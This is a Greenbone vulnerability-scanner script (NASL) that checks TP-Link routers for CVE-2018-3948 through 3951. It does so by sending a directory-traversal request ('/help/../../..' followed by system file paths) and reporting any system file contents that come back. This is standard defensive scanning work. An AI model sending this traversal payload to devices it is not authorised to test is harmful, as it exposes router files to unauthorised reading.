# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141702");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2018-11-20 08:40:10 +0700 (Tue, 20 Nov 2018)");
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2023-02-03 18:02:00 +0000 (Fri, 03 Feb 2023)");

  script_cve_id("CVE-2018-3948", "CVE-2018-3949", "CVE-2018-3950", "CVE-2018-3951");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("TP-Link Wi-Fi Routers Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_get_http_banner.nasl");
  script_mandatory_keys("Router_Webserver/banner");

  script_tag(name:"summary", value:"TP-Link Wi-Fi routers are prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"TP-Link Wi-Fi routers are prone to multiple vulnerabilities:

  - HTTP denial of service (CVE-2018-3948)

  - HTTP server information disclosure (CVE-2018-3949)

  - HTTP server ping address remote code execution (CVE-2018-3950)

  - HTTP server fs directory remote code execution (CVE-2018-3951)");

  script_tag(name:"affected", value:"TP-Link TL-R600VPN HWv3 FRNv1.3.0 and HWv2 FRNv1.2.3.

  At least TL-WA890EA with the most recent firmware version is known to be affected. Other devices
  and firmware versions might be affected as well.");

  script_tag(name:"solution", value:"Update to the latest firmware version.");

  script_xref(name:"URL", value:"https://blog.talosintelligence.com/2018/11/tplinkr600.html");
  script_xref(name:"URL", value:"https://www.tp-link.com/us/products/details/cat-4909_TL-R600VPN.html");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");
include("misc_func.inc");
include("traversal_func.inc");
include("host_details.inc");
include("os_func.inc");

port = http_get_port(default: 80);

banner = http_get_remote_headers(port: port);

if (banner && ("Server: Router Webserver" >< banner || banner =~ 'Basic realm="TP-LINK')) {

  files = traversal_files("linux");

  headers = make_array("Referer", http_report_vuln_url(port: port, url: "/Index.htm", url_only: TRUE));

  foreach pattern (keys(files)) {
    file = files[pattern];

    url = "/help/../../../../../../../../../../../../../../../../" + file;

    req = http_get_req(port: port, url: url, add_headers: headers);
    res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

    if (egrep(pattern: pattern, string: res, icase: FALSE)) {
      report = 'It was possible to obtain /' + file + ' with a directory traversal attack: ' + http_report_vuln_url(port: port, url: url, url_only: TRUE) + '\n\nResult:\n' + res;
      security_message(port: port, data: report);
      exit(0);
    }
  }

  exit(99);
}

exit(0);
